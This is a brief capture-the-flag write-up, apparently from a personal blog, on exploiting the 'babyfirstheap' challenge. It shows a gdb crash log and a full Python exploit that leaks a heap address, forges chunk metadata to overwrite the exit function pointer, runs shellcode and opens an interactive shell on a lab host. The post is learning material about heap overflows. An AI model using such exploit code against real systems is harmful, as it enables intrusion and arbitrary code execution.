<p>when open binary to hex-rays, i could see that successive free. it is very vulnerable So i debuged binary, then i faced segment fault</p>

<figure class='code'><figcaption><span>[crash the binary] (debug)</span> <a href='http://mashirogod.github.io/codeview/debug'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class=''><span class='line'><span class="vg">pwn@</span><span class="nl">ubuntu:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="vg">python</span><span class="w"> </span><span class="o">-</span><span class="vg">c</span><span class="w"> </span><span class="c1">&#39;print &quot;BBBB&quot;+&quot;CCCC&quot;+&quot;A&quot;*252&#39;&gt;&gt;poc</span>
</span><span class='line'><span class="vg">pwn@</span><span class="nl">ubuntu:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="vg">gdb</span><span class="w"> </span><span class="o">-</span><span class="vg">q</span><span class="w"> </span><span class="o">./</span><span class="vg">babyfirstheap</span>
</span><span class='line'><span class="vg">Reading</span><span class="w"> </span><span class="vg">symbols</span><span class="w"> </span><span class="vg">from</span><span class="w"> </span><span class="o">./</span><span class="vg">babyfirstheap</span><span class="o">...</span><span class="vg">done</span><span class="o">.</span>
</span><span class='line'><span class="p">(</span><span class="vg">gdb</span><span class="p">)</span><span class="w"> </span><span class="vg">r</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="vg">poc</span>
</span><span class='line'><span class="vg">Starting</span><span class="w"> </span><span class="nl">program:</span><span class="w"> </span><span class="o">/</span><span class="vg">home</span><span class="o">/</span><span class="vg">pwn</span><span class="o">/</span><span class="vg">babyfirstheap</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="vg">poc</span>
</span><span class='line'>
</span><span class='line'><span class="vg">Welcome</span><span class="w"> </span><span class="vg">to</span><span class="w"> </span><span class="vg">your</span><span class="w"> </span><span class="vg">first</span><span class="w"> </span><span class="vg">heap</span><span class="w"> </span><span class="vg">overflow</span><span class="o">...</span>
</span><span class='line'><span class="vg">I</span><span class="w"> </span><span class="vg">am</span><span class="w"> </span><span class="vg">going</span><span class="w"> </span><span class="vg">to</span><span class="w"> </span><span class="vg">allocate</span><span class="w"> </span><span class="il">20</span><span class="w"> </span><span class="vg">objects</span><span class="o">...</span>
</span><span class='line'><span class="vg">Using</span><span class="w"> </span><span class="vg">Dougle</span><span class="w"> </span><span class="vg">Lee</span><span class="w"> </span><span class="vg">Allocator</span><span class="w"> </span><span class="mf">2.6.1</span><span class="o">...</span>
</span><span class='line'><span class="vg">Goodluck!</span>
</span><span class='line'>
</span><span class='line'><span class="vg">Exit</span><span class="w"> </span><span class="vg">function</span><span class="w"> </span><span class="vg">pointer</span><span class="w"> </span><span class="vg">is</span><span class="w"> </span><span class="vg">at</span><span class="w"> </span><span class="il">804</span><span class="vg">C8AC</span><span class="w"> </span><span class="vg">address</span><span class="o">.</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2008</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1246</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC24F0</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1121</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2958</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">947</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2D10</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">741</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3000</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">706</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC32C8</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">819</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3600</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">673</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC38A8</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1004</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3C98</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">952</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC4058</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">755</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC4350</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">260</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC4458</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">877</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC47D0</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1245</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC4CB8</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1047</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC50D8</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1152</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC5560</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1047</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC5980</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1059</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC5DA8</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">906</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC6138</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">879</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC64B0</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">823</span><span class="p">]</span>
</span><span class='line'><span class="vg">Write</span><span class="w"> </span><span class="vg">to</span><span class="w"> </span><span class="vg">object</span><span class="w"> </span><span class="p">[</span><span class="vg">size</span><span class="o">=</span><span class="il">260</span><span class="p">]</span><span class="o">:</span>
</span><span class='line'><span class="vg">Copied</span><span class="w"> </span><span class="il">261</span><span class="w"> </span><span class="vg">bytes</span><span class="o">.</span>
</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2008</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC24F0</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2958</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2D10</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3000</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC32C8</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3600</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC38A8</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3C98</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC4058</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="vg">Program</span><span class="w"> </span><span class="vg">received</span><span class="w"> </span><span class="vg">signal</span><span class="w"> </span><span class="vg">SIGSEGV</span><span class="p">,</span><span class="w"> </span><span class="vg">Segmentation</span><span class="w"> </span><span class="vg">fault</span><span class="o">.</span>
</span><span class='line'><span class="nl">0</span><span class="vg">x080493f6</span><span class="w"> </span><span class="vg">in</span><span class="w"> </span><span class="vg">free</span><span class="w"> </span><span class="p">(</span><span class="vg">mem</span><span class="o">=</span><span class="il">0</span><span class="vg">x8ec4058</span><span class="p">)</span><span class="w"> </span><span class="vg">at</span><span class="w"> </span><span class="vg">malloc</span><span class="o">.</span><span class="nl">c:</span><span class="il">1259</span>
</span><span class='line'><span class="nl">1259</span><span class="w">  </span><span class="vg">malloc</span><span class="o">.</span><span class="nl">c:</span><span class="w"> </span><span class="err">그런</span><span class="w"> </span><span class="err">파일이나</span><span class="w"> </span><span class="err">디렉터리가</span><span class="w"> </span><span class="err">없습니다</span><span class="o">.</span>
</span><span class='line'><span class="p">(</span><span class="vg">gdb</span><span class="p">)</span><span class="w"> </span><span class="vg">i</span><span class="w"> </span><span class="vg">r</span>
</span><span class='line'><span class="vg">eax</span><span class="w">            </span><span class="il">0</span><span class="vg">x42424242</span><span class="w">  </span><span class="il">1111638594</span>
</span><span class='line'><span class="vg">ecx</span><span class="w">            </span><span class="il">0</span><span class="vg">x8ec2004</span><span class="w">   </span><span class="il">149692420</span>
</span><span class='line'><span class="vg">edx</span><span class="w">            </span><span class="il">0</span><span class="vg">x43434343</span><span class="w">  </span><span class="il">1128481603</span>
</span><span class='line'><span class="vg">ebx</span><span class="w">            </span><span class="il">0</span><span class="vg">xf76d7000</span><span class="w">  </span><span class="il">-143822848</span>
</span><span class='line'><span class="vg">esp</span><span class="w">            </span><span class="il">0</span><span class="vg">xffac4580</span><span class="w">  </span><span class="il">0</span><span class="vg">xffac4580</span>
</span><span class='line'><span class="vg">ebp</span><span class="w">            </span><span class="il">0</span><span class="vg">xffac45b8</span><span class="w">  </span><span class="il">0</span><span class="vg">xffac45b8</span>
</span><span class='line'><span class="vg">esi</span><span class="w">            </span><span class="il">0</span><span class="vg">x0</span><span class="w"> </span><span class="il">0</span>
</span><span class='line'><span class="vg">edi</span><span class="w">            </span><span class="il">0</span><span class="vg">x0</span><span class="w"> </span><span class="il">0</span>
</span><span class='line'><span class="vg">eip</span><span class="w">            </span><span class="il">0</span><span class="vg">x80493f6</span><span class="w">   </span><span class="il">0</span><span class="vg">x80493f6</span><span class="w"> </span><span class="o">&lt;</span><span class="vg">free</span><span class="o">+</span><span class="il">273</span><span class="o">&gt;</span>
</span><span class='line'><span class="vg">eflags</span><span class="w">         </span><span class="il">0</span><span class="vg">x10216</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="vg">PF</span><span class="w"> </span><span class="vg">AF</span><span class="w"> </span><span class="kr">IF</span><span class="w"> </span><span class="vg">RF</span><span class="w"> </span><span class="p">]</span>
</span><span class='line'><span class="vg">cs</span><span class="w">             </span><span class="il">0</span><span class="vg">x23</span><span class="w">    </span><span class="il">35</span>
</span><span class='line'><span class="vg">ss</span><span class="w">             </span><span class="il">0</span><span class="vg">x2b</span><span class="w">    </span><span class="il">43</span>
</span><span class='line'><span class="vg">ds</span><span class="w">             </span><span class="il">0</span><span class="vg">x2b</span><span class="w">    </span><span class="il">43</span>
</span><span class='line'><span class="vg">es</span><span class="w">             </span><span class="il">0</span><span class="vg">x2b</span><span class="w">    </span><span class="il">43</span>
</span><span class='line'><span class="vg">fs</span><span class="w">             </span><span class="il">0</span><span class="vg">x0</span><span class="w"> </span><span class="il">0</span>
</span><span class='line'><span class="vg">gs</span><span class="w">             </span><span class="il">0</span><span class="vg">x63</span><span class="w">    </span><span class="il">99</span>
</span><span class='line'><span class="p">(</span><span class="vg">gdb</span><span class="p">)</span><span class="w"> </span><span class="vg">x</span><span class="o">/</span><span class="vg">i</span><span class="w"> </span><span class="err">$</span><span class="vg">pc</span>
</span><span class='line'><span class="o">=&gt;</span><span class="w"> </span><span class="il">0</span><span class="vg">x80493f6</span><span class="w"> </span><span class="o">&lt;</span><span class="vg">free</span><span class="o">+</span><span class="il">273</span><span class="o">&gt;:</span><span class="w">   </span><span class="vg">mov</span><span class="w">    </span><span class="o">%</span><span class="vg">edx</span><span class="p">,</span><span class="il">0</span><span class="vg">x8</span><span class="p">(</span><span class="o">%</span><span class="vg">eax</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>i hereby control got overwrite.(specific technic about this vuln that reference<a href="https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf">https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf</a></p>

<figure class='code'><figcaption><span>[Baby's first heap] (babyfirstheap.py)</span> <a href='http://mashirogod.github.io/codeview/babyfirstheap.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">from</span> <span class="nn">pwn_expoit</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="n">a</span> <span class="o">=</span> <span class="mf">0.3</span>
</span><span class='line'><span class="k">def</span> <span class="nf">MakeCon</span><span class="p">():</span>
</span><span class='line'>  <span class="n">MakeCon</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&quot;192.168.224.152&quot;</span><span class="p">,</span><span class="mi">4444</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">MakeCon</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">MakeCon</span><span class="p">()</span>
</span><span class='line'><span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;[size=260]&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">18</span><span class="p">:</span><span class="o">-</span><span class="mi">11</span><span class="p">]</span>
</span><span class='line'><span class="n">hex_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">&quot;0x&quot;</span><span class="o">+</span><span class="n">leak</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">hex_addr</span>
</span><span class='line'><span class="n">exit_func</span> <span class="o">=</span> <span class="mh">0x804c8ac</span>
</span><span class='line'><span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xeb\x0c</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">nopsled</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">shellcode</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">260</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">dat</span><span class="p">))</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x01\x00\x00\x00</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">exit_func</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">hex_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dat</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
</feed>
